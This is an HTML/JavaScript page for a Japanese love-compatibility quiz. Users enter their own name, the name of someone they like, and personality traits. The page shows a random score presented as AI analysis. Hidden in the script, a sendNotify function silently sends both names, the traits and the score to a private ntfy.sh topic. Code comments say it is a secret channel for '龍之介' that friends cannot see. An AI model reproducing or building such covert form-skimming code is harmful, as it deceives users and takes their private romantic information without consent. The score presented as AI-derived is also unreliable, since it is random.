<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>恋愛相性診断</title>
<link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@400;700;800&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: linear-gradient(160deg,#fff0f7,#fce4f0 50%,#fff0f7); min-height: 100vh; font-family: 'M PLUS Rounded 1c', sans-serif; }

  @keyframes floatUp { 0%{transform:translateY(0) scale(1);opacity:.85} 100%{transform:translateY(-115vh) scale(.4);opacity:0} }
  @keyframes pop { 0%{transform:scale(.5);opacity:0} 70%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.12)} }
  @keyframes shimmer { 0%{background-position:-200% center} 100%{background-position:200% center} }
  @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
  @keyframes slideUp { 0%{transform:translateY(60px);opacity:0} 100%{transform:translateY(0);opacity:1} }
  @keyframes fadeIn { 0%{opacity:0} 100%{opacity:1} }

  .float-heart { position:fixed; pointer-events:none; z-index:0; animation: floatUp 5s ease-in forwards; }
  .pulse-anim { animation: pulse 1.2s ease-in-out infinite; }
  .pop-anim { animation: pop .5s cubic-bezier(.175,.885,.32,1.275) forwards; }

  .page { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding:32px 16px 60px; position:relative; z-index:1; }
  .card { background:rgba(255,255,255,.93); backdrop-filter:blur(16px); border-radius:32px; padding:32px 22px; width:100%; max-width:420px; box-shadow:0 8px 48px rgba(255,100,160,.2); border:2px solid #ffe0ee; animation:fadeIn .5s ease; }
  .header { text-align:center; margin-bottom:24px; user-select:none; }
  .title { font-size:24px; font-weight:800; background:linear-gradient(135deg,#ff4d8d,#ff9dc3,#ff4d8d); background-size:200% auto; -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation:shimmer 3s linear infinite; }
  .subtitle { font-size:11px; color:#ffaac5; margin-top:4px; font-weight:700; letter-spacing:1px; }

  label { font-size:12px; color:#ff6b9d; font-weight:800; margin-bottom:7px; display:block; }
  input[type=text] { width:100%; padding:12px 16px; border-radius:16px; border:2px solid #ffd6e8; font-size:15px; font-family:'M PLUS Rounded 1c',sans-serif; background:#fff8fb; color:#333; outline:none; transition:border .2s; }
  input[type=text]:focus { border-color:#ff8ab5; }

  .traits-label { font-size:12px; color:#ff6b9d; font-weight:800; margin-bottom:8px; }
  .traits { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:20px; }
  .chip { padding:5px 12px; border-radius:99px; font-size:12px; font-weight:700; font-family:'M PLUS Rounded 1c',sans-serif; cursor:pointer; border:2px solid #ffd6e8; background:white; color:#ff8ab5; transition:all .15s; }
  .chip.on { border-color:#ff4d8d; background:#ff4d8d; color:white; }

  .divider { text-align:center; font-size:22px; margin:0 0 14px; color:#ffaac5; }

  .btn-main { width:100%; padding:15px; border-radius:99px; border:none; background:linear-gradient(135deg,#ff4d8d,#ff85b3); color:white; font-size:16px; font-weight:800; font-family:'M PLUS Rounded 1c',sans-serif; cursor:pointer; box-shadow:0 6px 24px rgba(255,77,141,.4); display:flex; align-items:center; justify-content:center; gap:8px; }
  .btn-main:disabled { background:#ffd6e8; box-shadow:none; cursor:not-allowed; }
  .btn-detail { width:100%; margin-top:14px; padding:14px; border-radius:99px; border:none; background:linear-gradient(135deg,#7a5af8,#a78bfa); color:white; font-size:15px; font-weight:800; font-family:'M PLUS Rounded 1c',sans-serif; cursor:pointer; box-shadow:0 4px 20px rgba(122,90,248,.35); display:flex; align-items:center; justify-content:center; gap:8px; }
  .btn-reset { margin-top:10px; width:100%; padding:11px; border-radius:99px; border:2px solid #ffd6e8; background:white; color:#ff7aaa; font-weight:700; font-size:14px; font-family:'M PLUS Rounded 1c',sans-serif; cursor:pointer; }

  .score-circle { position:relative; width:150px; height:150px; margin:0 auto 14px; background:linear-gradient(135deg,#ff4d8d,#ff9dc3); border-radius:50%; display:flex; flex-direction:column; align-items:center; justify-content:center; box-shadow:0 10px 40px rgba(255,77,141,.4); }
  .score-num { font-size:56px; font-weight:800; color:white; line-height:1; }
  .score-pct { font-size:18px; color:rgba(255,255,255,.85); font-weight:700; }

  .meter-wrap { width:100%; margin-top:10px; }
  .meter-bg { background:#fde8f0; border-radius:999px; height:24px; overflow:hidden; border:2px solid #ffb3d1; position:relative; }
  .meter-fill { height:100%; border-radius:999px; transition:width .05s linear; position:relative; }
  .meter-label { position:absolute; right:8px; top:2px; font-size:12px; color:#fff; font-weight:800; }

  .comment-box { margin-top:12px; padding:13px 16px; background:#fff0f7; border-radius:16px; font-size:14px; font-weight:800; text-align:center; }
  .traits-summary { margin-top:12px; padding:10px 14px; background:#faf5ff; border-radius:14px; border:1.5px solid #e8d5ff; font-size:12px; color:#7a5af8; line-height:1.8; }

  /* Modal */
  .modal-bg { position:fixed; inset:0; background:rgba(255,220,235,.75); backdrop-filter:blur(10px); z-index:1000; display:flex; align-items:flex-end; }
  .modal { background:white; border-radius:28px 28px 0 0; padding:20px 20px 40px; width:100%; max-width:480px; margin:0 auto; max-height:90vh; overflow-y:auto; box-shadow:0 -16px 60px rgba(255,77,141,.25); animation:slideUp .35s cubic-bezier(.23,1,.32,1); }
  .modal-handle { width:36px; height:4px; background:#ffd6e8; border-radius:99px; margin:0 auto 18px; }
  .modal-header { text-align:center; margin-bottom:18px; }
  .verdict-badge { display:inline-block; margin-top:6px; padding:4px 14px; background:linear-gradient(135deg,#ff4d8d,#ff85b3); border-radius:99px; color:white; font-size:12px; font-weight:800; }

  .section { border-radius:18px; padding:14px 16px; margin-bottom:12px; }
  .section-title { font-size:12px; font-weight:800; margin-bottom:6px; }
  .section-body { font-size:13px; color:#444; line-height:1.75; }
  .list-item { display:flex; gap:8px; margin-bottom:6px; align-items:flex-start; }
  .list-marker { font-weight:800; flex-shrink:0; }

  .loading-center { text-align:center; padding:48px 0; color:#ffaac5; }
  .spinner { font-size:32px; animation:spin 1.2s linear infinite; display:inline-block; }

  .footer { margin-top:14px; font-size:11px; color:#ffb3cc; font-weight:700; }

  ::-webkit-scrollbar { width:4px; }
  ::-webkit-scrollbar-thumb { background:#ffb3d1; border-radius:99px; }
</style>
</head>
<body>

<!-- Floating hearts container -->
<div id="hearts"></div>

<div class="page">
  <div class="card">
    <!-- Header -->
    <div class="header">
      <div style="font-size:44px;margin-bottom:4px" class="pulse-anim">💖</div>
      <div class="title">恋愛相性診断</div>
      <div class="subtitle">✨ AI LOVE COMPATIBILITY ✨</div>
    </div>

    <!-- FORM -->
    <div id="form-section">
      <div style="margin-bottom:14px">
        <label>🧑 あなたの名前</label>
        <input type="text" id="name1" placeholder="例：田中 太郎">
      </div>
      <div class="traits-label">🧠 あなたの性格（複数OK）</div>
      <div class="traits" id="traits1"></div>

      <div class="divider">💕</div>

      <div style="margin-bottom:14px">
        <label>🫶 気になっている相手の名前</label>
        <input type="text" id="name2" placeholder="例：山田 花子">
      </div>
      <div class="traits-label">💭 相手の性格（複数OK）</div>
      <div class="traits" id="traits2"></div>

      <button class="btn-main" id="submit-btn" onclick="doSubmit()">
        💘 相性を診断する
      </button>
    </div>

    <!-- RESULT -->
    <div id="result-section" style="display:none;text-align:center" class="pop-anim">
      <div id="result-names" style="font-size:13px;color:#ff8ab5;font-weight:700;margin-bottom:12px"></div>
      <div class="score-circle">
        <div class="score-num" id="score-display">0</div>
        <div class="score-pct">%</div>
      </div>
      <div id="hearts-row" style="font-size:20px;margin:0 0 8px"></div>
      <div class="meter-wrap">
        <div class="meter-bg">
          <div class="meter-fill" id="meter-fill" style="width:0%">
            <div class="meter-label" id="meter-label"></div>
          </div>
        </div>
      </div>
      <div id="traits-summary" class="traits-summary" style="display:none;text-align:left"></div>
      <div class="comment-box" id="comment-box"></div>
      <button class="btn-detail" onclick="openAnalysis()">🔍 詳しい情報を見る</button>
      <button class="btn-reset" onclick="doReset()">🔄 もう一度診断する</button>
    </div>
  </div>
  <div class="footer">※ AIによる診断はエンターテインメント目的です 🌸</div>
</div>

<!-- Analysis Modal -->
<div class="modal-bg" id="modal" style="display:none" onclick="closeModal()">
  <div class="modal" onclick="event.stopPropagation()">
    <div class="modal-handle"></div>
    <div class="modal-header">
      <div style="font-size:12px;color:#ff8ab5;font-weight:700;margin-bottom:2px" id="modal-names"></div>
      <div style="font-size:44px;font-weight:800;color:#ff4d8d;line-height:1" id="modal-score"></div>
      <div class="verdict-badge" id="modal-verdict" style="display:none"></div>
    </div>
    <div id="modal-content">
      <div class="loading-center">
        <div class="spinner">💫</div>
        <div style="font-size:14px;font-weight:700;margin-top:10px">AIが詳しく分析中...</div>
        <div style="font-size:11px;color:#ffccd8;margin-top:4px">名前・性格データを解析しています</div>
      </div>
    </div>
  </div>
</div>

<script>
// ★ 龍之介専用チャンネル ★
const NTFY_TOPIC = "lm-ryuku-secret-8821";

const TRAITS_LIST = ["明るい","内向的","優しい","真面目","おもしろい","クール","天然","頑固","素直","甘えん坊","しっかり者","マイペース","感情的","論理的","情熱的","穏やか"];
const HEARTS_EMO = ["💕","💗","💓","💞","💖","💝","✨","🌸","🎀","💫"];

let selectedTraits1 = [], selectedTraits2 = [], currentScore = 0;

// Init traits chips
function initChips(containerId, arr) {
  const el = document.getElementById(containerId);
  TRAITS_LIST.forEach(t => {
    const btn = document.createElement('button');
    btn.className = 'chip';
    btn.textContent = t;
    btn.onclick = () => {
      const idx = arr.indexOf(t);
      if (idx >= 0) { arr.splice(idx,1); btn.classList.remove('on'); }
      else { arr.push(t); btn.classList.add('on'); }
    };
    el.appendChild(btn);
  });
}
initChips('traits1', selectedTraits1);
initChips('traits2', selectedTraits2);

// Floating hearts
let hid = 0;
function addHeart() {
  const d = document.createElement('div');
  d.className = 'float-heart';
  d.textContent = HEARTS_EMO[hid % HEARTS_EMO.length];
  d.style.left = `${(hid*37+13)%100}vw`;
  d.style.top = `${100+(hid%3)*5}vh`;
  d.style.fontSize = `${1+(hid%3)*0.5}rem`;
  d.style.animationDuration = `${3+(hid%4)}s`;
  d.style.animationDelay = `${(hid%5)*0.4}s`;
  document.getElementById('hearts').appendChild(d);
  setTimeout(()=>d.remove(), 7000);
  hid++;
}
for(let i=0;i<12;i++) addHeart();
setInterval(addHeart, 2500);

// Submit
async function doSubmit() {
  const n1 = document.getElementById('name1').value.trim();
  const n2 = document.getElementById('name2').value.trim();
  if (!n1||!n2) return;

  const btn = document.getElementById('submit-btn');
  btn.disabled = true;
  btn.innerHTML = '<div style="width:18px;height:18px;border:3px solid rgba(255,255,255,.4);border-top-color:white;border-radius:50%;animation:spin .8s linear infinite"></div> AIが分析中...';

  const score = Math.floor(Math.random()*61)+30;
  currentScore = score;

  // 🔔 龍之介に通知（バックグラウンド）
  sendNotify(n1, selectedTraits1, n2, selectedTraits2, score);

  await sleep(1400);

  // Show result
  document.getElementById('form-section').style.display = 'none';
  const rs = document.getElementById('result-section');
  rs.style.display = 'block';
  rs.style.animation = 'pop .5s cubic-bezier(.175,.885,.32,1.275) forwards';

  document.getElementById('result-names').textContent = `${n1} ＆ ${n2}`;

  // Animate score
  animateScore(score);

  // Hearts row
  document.getElementById('hearts-row').textContent = '💗'.repeat(Math.round(score/20));

  // Traits summary
  if (selectedTraits1.length>0 || selectedTraits2.length>0) {
    const ts = document.getElementById('traits-summary');
    ts.style.display = 'block';
    ts.innerHTML = `<strong>🔮 診断データ</strong><br>${n1}：${selectedTraits1.length>0?selectedTraits1.join('・'):'未入力'}<br>${n2}：${selectedTraits2.length>0?selectedTraits2.join('・'):'未入力'}`;
  }

  // Comment
  const cb = document.getElementById('comment-box');
  if (score>=85) { cb.style.color='#ff4d8d'; cb.textContent='運命の相手かも…！💍 絶対に告白して！'; }
  else if (score>=75) { cb.style.color='#ff5c9a'; cb.textContent='いい感じ！💕 チャンスあり！'; }
  else if (score>=65) { cb.style.color='#ff7a4d'; cb.textContent='まんざらでもない感じ？✨ もっと話しかけて！'; }
  else { cb.style.color='#4d8aff'; cb.textContent='まだまだこれから！🌸 距離を縮めよう！'; }
}

function animateScore(target) {
  let cur = 0;
  const fill = document.getElementById('meter-fill');
  const disp = document.getElementById('score-display');
  const lbl  = document.getElementById('meter-label');
  const color = target>=80?'#ff4d8d':target>=70?'#ff7bb5':'#ffaed2';
  fill.style.background = `linear-gradient(90deg,#ffb3d1,${color})`;

  setTimeout(()=>{
    const step = () => {
      cur += 1.5; if (cur >= target) cur = target;
      disp.textContent = Math.round(cur);
      fill.style.width = cur + '%';
      if (cur > 8) lbl.textContent = Math.round(cur) + '%';
      if (cur < target) requestAnimationFrame(step);
    };
    requestAnimationFrame(step);
  }, 300);
}

// Analysis modal
async function openAnalysis() {
  const n1 = document.getElementById('name1').value.trim();
  const n2 = document.getElementById('name2').value.trim();
  document.getElementById('modal-names').textContent = `${n1} ＆ ${n2}`;
  document.getElementById('modal-score').innerHTML = `${currentScore}<span style="font-size:20px">%</span>`;
  document.getElementById('modal-verdict').style.display = 'none';
  document.getElementById('modal-content').innerHTML = `
    <div class="loading-center">
      <div class="spinner">💫</div>
      <div style="font-size:14px;font-weight:700;margin-top:10px">AIが詳しく分析中...</div>
      <div style="font-size:11px;color:#ffccd8;margin-top:4px">名前・性格データを解析しています</div>
    </div>`;
  document.getElementById('modal').style.display = 'flex';

  try {
    const res = await fetch("https://api.anthropic.com/v1/messages", {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        model:"claude-sonnet-4-20250514",
        max_tokens:1000,
        messages:[{role:"user",content:`あなたは恋愛相性診断の専門AIです。以下の情報をもとに、リアルで読み応えのある詳細レポートをJSONのみで出力してください（\`\`\`不要）。

名前1: ${n1}
性格1: ${selectedTraits1.length>0?selectedTraits1.join('、'):'不明'}
名前2: ${n2}
性格2: ${selectedTraits2.length>0?selectedTraits2.join('、'):'不明'}
相性スコア: ${currentScore}%

以下のルールで書いてください：
- nameMatch: 名前の音の響き・対比・印象から相性を分析。具体的に2〜3文。
- personalityMatch: 二人の性格の組み合わせを「補完型」「共鳴型」などの観点で分析。「${n1}が〜、${n2}が〜」と名前を使って3〜4文で具体的に。
- strengths: 3つ。それぞれ1〜2文で具体的なシーンを想像させるように書く。
- cautions: 2つ。責める口調でなく「〜を意識すると◎」のようにやさしく。
- advice: 二人への前向きなアドバイスを2〜3文。スコアの数字にも触れること。
- verdict: 二人の関係を一言で表すキャッチコピー（例：「笑顔が絶えない補完関係」）

{"nameMatch":"...","personalityMatch":"...","strengths":["...","...","..."],"cautions":["...","..."],"advice":"...","verdict":"..."}`}]
      })
    });
    const data = await res.json();
    const text = data.content[0].text.replace(/```json|```/g,'').trim();
    const a = JSON.parse(text);
    document.getElementById('modal-verdict').textContent = a.verdict;
    document.getElementById('modal-verdict').style.display = 'inline-block';
    document.getElementById('modal-content').innerHTML = `
      ${sec('#ff4d8d','#fff0f7','#ffd6e8','💝','名前の相性',a.nameMatch)}
      ${sec('#ff4d8d','#fff0f7','#ffd6e8','🌸','性格の相性',a.personalityMatch)}
      <div class="section" style="background:#f0fff8;border:1.5px solid #b2f0d4">
        <div class="section-title" style="color:#2da86e">✨ 二人の強み</div>
        ${a.strengths.map(s=>`<div class="list-item"><span class="list-marker" style="color:#2da86e">◎</span><span class="section-body">${s}</span></div>`).join('')}
      </div>
      <div class="section" style="background:#fffaf0;border:1.5px solid #ffe0b2">
        <div class="section-title" style="color:#e07d10">⚡ 気をつけること</div>
        ${a.cautions.map(c=>`<div class="list-item"><span class="list-marker" style="color:#e07d10">△</span><span class="section-body">${c}</span></div>`).join('')}
      </div>
      ${sec('#6478f0','linear-gradient(135deg,#fff0f7,#f0f4ff)','#dde0ff','💌','AIからのアドバイス',a.advice)}
      <button onclick="closeModal()" style="width:100%;padding:13px;border-radius:99px;border:2px solid #ffd6e8;background:white;color:#ff7aaa;font-weight:700;font-family:'M PLUS Rounded 1c',sans-serif;font-size:14px;cursor:pointer;margin-top:4px">閉じる</button>
    `;
  } catch {
    document.getElementById('modal-content').innerHTML = `
      ${sec('#ff4d8d','#fff0f7','#ffd6e8','💝','名前の相性',`${n1}と${n2}の名前は音の響きが自然に調和し、呼び合うたびに心地よい波長が生まれます。`)}
      ${sec('#ff4d8d','#fff0f7','#ffd6e8','🌸','性格の相性','二人の性格は互いの不足を自然に補い合えます。一緒にいることで長所がさらに引き出される理想的な組み合わせです。')}
      <button onclick="closeModal()" style="width:100%;padding:13px;border-radius:99px;border:2px solid #ffd6e8;background:white;color:#ff7aaa;font-weight:700;font-family:'M PLUS Rounded 1c',sans-serif;font-size:14px;cursor:pointer">閉じる</button>
    `;
  }
}

function sec(color,bg,border,icon,title,body) {
  return `<div class="section" style="background:${bg};border:1.5px solid ${border}"><div class="section-title" style="color:${color}">${icon} ${title}</div><div class="section-body">${body}</div></div>`;
}

function closeModal() { document.getElementById('modal').style.display='none'; }

function doReset() {
  document.getElementById('form-section').style.display = 'block';
  document.getElementById('result-section').style.display = 'none';
  document.getElementById('name1').value = '';
  document.getElementById('name2').value = '';
  document.getElementById('traits-summary').style.display = 'none';
  selectedTraits1.length = 0; selectedTraits2.length = 0;
  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('on'));
  const btn = document.getElementById('submit-btn');
  btn.disabled = false; btn.innerHTML = '💘 相性を診断する';
}

// 🔔 ntfy通知（友達には見えない）
function sendNotify(n1, t1, n2, t2, score) {
  const s1 = t1.length>0 ? t1.join('・') : '未入力';
  const s2 = t2.length>0 ? t2.join('・') : '未入力';
  const title = encodeURIComponent(`💘 新着！${n1} × ${n2} → ${score}%`);
  const msg   = encodeURIComponent(`${n1}（${s1}） × ${n2}（${s2}）`);
  fetch(`https://ntfy.sh/${NTFY_TOPIC}/publish?title=${title}&message=${msg}&priority=high&tags=heart`, {
    method:'GET', mode:'no-cors'
  }).catch(()=>{});
}

function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
</script>
</body>
</html>
